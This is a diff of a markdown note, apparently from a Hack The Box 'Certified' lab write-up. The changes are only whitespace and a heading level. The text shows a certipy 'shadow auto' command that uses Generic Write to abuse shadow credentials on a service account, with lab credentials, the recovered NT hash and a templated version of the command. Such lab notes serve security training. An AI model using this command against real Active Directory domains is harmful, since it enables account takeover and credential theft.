@@ -4,8 +4,6 @@ Generic Write access grants you the ability to write to any non-protected attrib
 
 ![[Pasted image 20241110204524.png]]
 
-
-
 ```bash
 garffff@garffff:~/htb/certified$ certipy shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -28,7 +26,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
 ```
 
-### Summary
+#### Summary
 
 ```bash
 certipy shadow auto -u <username>@<domain> -p <password> -account <target_account>
